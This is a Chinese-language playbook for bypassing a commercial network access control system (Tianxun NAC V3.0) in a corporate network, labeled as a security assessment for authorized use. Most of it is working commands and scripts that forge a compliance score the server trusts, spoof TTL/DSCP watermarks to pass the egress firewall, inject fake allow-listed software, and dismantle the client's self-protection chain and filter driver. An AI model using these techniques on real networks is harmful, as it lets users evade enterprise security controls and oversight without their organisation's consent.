# NAC 阻断启用后作战手册（安全评估）

> 目的：当公司 NAC 系统启用「网络阻断」后，如何快速验证、诊断、应对。
> 本手册基于对启明星辰天珣 NAC（天清网络接入控制系统 V3.0）的逆向 + 实测成果。
> **仅限授权环境使用。**

---

## 一、阻断启用的判定方法

### 1.1 如何判断公司是否已启用阻断

**最直接**：测试外网连通性。

```powershell
# 目标机执行
Test-NetConnection -ComputerName 8.8.8.8 -Port 443
Test-NetConnection -ComputerName www.baidu.com -Port 443
```

- 若之前通、现在**突然不通** → 阻断已启用（或进入违规状态）；
- 若仍通 → 阻断未启用。

**更精确**：查注册表 + 日志。

```powershell
# 查 fwdsa（防火墙策略 ID）：0=不阻断，3=放行，12=拦截
Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\NACC" | Select fwdsa,under_nat,seccheck_state

# 查日志（fwdsa 变化轨迹）
# C:\Program Files (x86)\NACC\log\CCInfo.log
```

### 1.2 阻断的三种可能形态

| 形态 | 执行位置 | 表现 | 绕过方向 |
|------|---------|------|---------|
| **终端侧阻断** | ndisnac.sys 驱动白名单 | 本机非白名单流量被拦 | 解绑驱动 / 改白名单 / 上报合规 |
| **出口侧阻断** | 公司出口防火墙 | 整个 NAT 出口被拦 | 打 TTL/DSCP 水印 |
| **交换机侧阻断** | 802.1X 端口 | 端口级断网 | 模拟 EAPOL 认证 |

## 二、核心判定链路（阻断启用后）

```
① 客户端上报 score（check/helper + check/result）
        ↓
② 服务器判定合规 → 返回 fwdsa（3=放行 / 12=拦截）+ 水印参数
        ↓
③ 服务器下发策略到网络设备（防火墙/交换机）
        ↓
④ 网络设备执行：
   - fwdsa=3 且 under_nat=0 → 按 IP 放行
   - fwdsa=3 且 under_nat=1 → 要求 TTL/DSCP 水印匹配才放行
   - fwdsa=12 → 拦截
```

**关键点**：第 ② 步服务器完全信任客户端上报的 score（不独立复核），
这是整条链路最薄弱的环节，也是 MVP 的核心突破口。

## 三、应对方案（按优先级）

### 方案 A：MVP 直接上报合规（最简，已验证）

```powershell
# 复用会话，直接上报 score=90
$env:NAC_SESSIONID = "<SESSIONID_PLACEHOLDER>"
$env:NAC_PSKEY     = "<NAC_PSKEY>"
$env:NAC_USERNAME  = "<NAC_USERNAME>"
python nac_client_mvp.py   # 上报 score=90 → fwdsa=3 + 水印参数
```

**适用**：服务器只按 score 判定（已实测：score=90 → fwdsa=3）。

### 方案 B：打水印穿透 NAT 出口（阻断启用 + under_nat=1 时）

```powershell
# 管理员身份运行（打水印需要提权）
python nac_client_mvp.py   # 会自动解析 under_nat=1 → 打 TTL=175/DSCP=41

# 验证水印是否打上
python verify_watermark.py
```

**适用**：公司出口防火墙按 TTL/DSCP 水印识别 NAT 后的合规设备。

### 方案 C：伪造红名单软件（软件合规检查）

```powershell
# 注入红名单软件条目（北信源/办公终端管控平台）
.\nac_compliance_bypass.ps1 -Action check      # 检查当前红名单状态
.\nac_compliance_bypass.ps1 -Action inject     # 注入伪造软件
.\nac_compliance_bypass.ps1 -Action verify     # 验证注入效果
```

**适用**：服务器启用「软件红名单检查」（实测已启用）。

### 方案 D：自由关停 NACC 客户端（nacc_control.py 补丁）

```powershell
# 管理员 PowerShell 运行
python nacc_control.py stop      # 关停 NACC（进程+服务+解除驱动绑定）
python nacc_control.py start     # 恢复 NACC（服务+进程+恢复驱动绑定）
python nacc_control.py status    # 查看状态
```

**适用**：需要彻底关停 NAC 客户端（终端侧拦截驱动失效）的场景。

**破解的自保护守护链**：

```
自启动 Run 键 → NACCControl.exe（界面）
NACCService（LocalSystem，Start=2）→ NACC.exe（主进程）
CCMon.exe（守护：定时轮询枚举进程，发现 NACC.exe 不在就 StartServiceA 拉起）
```

**关停要点**：先 `sc config NACCService start= disabled`（让守护的
`StartServiceA` 失败、斩断守护链）→ 杀进程 → 解绑驱动。

> ⚠️ **关键教训**：不要 `sc stop` 驱动！`ndisnac.sys` 是 NDIS 过滤驱动，
> `sc stop` 会导致断网 + `tdinac` 卡 Stop Pending 僵尸状态（只能重启恢复）。
> 正确做法是用 `Disable-NetAdapterBinding` 解除驱动对网卡的绑定
> （等效手动取消网卡属性里的勾选，安全、不断网、可逆）。

**实测结果**：`stop → start` 完整闭环验证通过，无断网（仅毫秒级网卡重连）。

## 四、验证方法（阻断启用后）

### 4.1 验证合规状态变化

```powershell
# 上报 score=90 前后，对比 access_policy.json 的 fwdsa
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$s.Cookies.Add((New-Object System.Net.Cookie("VSG_SESSIONID","<SESSIONID_PLACEHOLDER>","/","<NAC_SERVER_IP>")))
(Invoke-WebRequest -Uri "https://<NAC_SERVER_IP>/nac/user/check/access_policy.json" -WebSession $s -SkipCertificateCheck).Content
```

### 4.2 验证水印是否打上

```powershell
python verify_watermark.py
# 预期：默认 TTL=175，QoS DSCP=41
```

### 4.3 验证外网是否放行

```powershell
# 打水印后测试外网
Test-NetConnection 8.8.8.8 -Port 443
# 若通 → 水印被出口防火墙识别，放行成功
```
